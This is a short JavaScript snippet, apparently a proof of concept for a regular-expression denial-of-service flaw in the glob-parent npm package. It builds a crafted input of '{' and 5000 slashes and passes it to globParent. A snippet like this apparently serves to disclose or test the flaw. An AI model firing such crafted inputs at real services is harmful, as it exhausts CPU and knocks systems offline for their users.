function buildAttack (n) {
  let ret = '{'
  for (let i = 0; i < n; i++) {
    ret += '/'
  }

  return ret
}

const globParent = require('glob-parent')
globParent(buildAttack(5000))
